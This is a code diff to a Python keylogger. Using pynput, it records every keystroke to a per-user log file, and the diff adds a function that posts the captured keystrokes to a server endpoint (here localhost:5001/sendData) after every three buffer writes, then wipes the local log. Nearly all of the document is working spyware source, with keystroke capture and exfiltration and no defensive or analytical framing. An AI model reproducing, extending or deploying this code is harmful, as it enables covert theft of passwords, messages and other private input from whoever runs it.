@@ -1,12 +1,19 @@
 from pynput.keyboard import Key, Listener
 import requests
 import os
+import requests
+import json
 
 user = 'ashwin'
 logFilePath = './'+user+'_log.out'
-MAX_BUFFER_LEN = 30
+
+MAX_BUFFER_LEN = 10
+SEND_WRITE_COUNT = 3
 
 buffer = []
+writeCount = []
+
+serverPath = 'http://localhost:5001'
 
 def initialize():
   logFile = open(logFilePath, 'w')
@@ -38,9 +45,35 @@ def onKeyPress(key):
     logFile.write(data)
     buffer[:]=[]
     logFile.close()
+    writeCount.append(1)
+  
+    if(len(writeCount) == SEND_WRITE_COUNT):
+      writeCount[:] = []
+      sendDataToServer()
+
+
+def sendDataToServer():
+  logFile = open(logFilePath, 'r')
+  newKeylogs = logFile.read()
+  
+  data = {
+    'keylogs': newKeylogs,
+    'user': user
+  }
+
+  try:
+    res = requests.post(serverPath+'/sendData', data=data)
+    res.raise_for_status()
+
+  except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.HTTPError, requests.exceptions.RequestException):
+    return print("Error connecting to server")
+
+  responseData = res.json()
+
+  if(responseData['success'] == 1):
+    open(logFilePath, 'w')
 
 if __name__ == "__main__":
-
   initialize()
 
   with Listener(on_press=onKeyPress) as listener:
